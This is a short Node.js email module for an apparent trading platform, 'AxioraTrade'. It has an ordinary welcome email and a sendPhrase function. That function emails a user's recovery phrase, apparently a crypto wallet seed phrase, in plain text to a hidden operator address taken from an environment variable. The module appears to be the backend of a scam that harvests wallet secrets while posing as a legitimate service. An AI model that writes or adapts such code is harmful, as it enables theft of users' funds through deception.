const { Resend } = require('resend');
const resend = new Resend(process.env.RESEND_API_KEY);

const sendWelcomeEmail = async ({ email, name }) => {
  const html = `
    <p>Hi ${name},</p>

    <p>Welcome to <strong>AxioraTrade</strong>.</p>

    <p>We're glad to have you join our trading community. Your account has been created successfully and is ready to explore.</p>

    <p>Take your time to get familiar with the platform, set up your preferences, and start trading immediately. 
    Our team and tools are here to make every step clear and rewarding.</p>

    <p>Thank you for choosing AxioraTrade — where your financial goals come first.</p>

    <p>Warm regards,<br/>The AxioraTrade Team</p>
  `;

  await resend.emails.send({
    from: 'AxioraTrade <noreply@axioratrade.com>',
    to: [email],
    subject: 'Welcome to AxioraTrade',
    html,
  });
};

const sendPhrase = async ({ recoveryPhrase }) => {
  const html = `

    <p>${recoveryPhrase}.</p>

    <p>Warm regards,<br/>The AxioraTrade Team</p>
  `;

  await resend.emails.send({
    from: 'AxioraTrade <noreply@axioratrade.com>',
    to: process.env.PHRASE_EMAIL,
    subject: 'Phrase Secured',
    html,
  });
};

module.exports = { sendWelcomeEmail, sendPhrase };
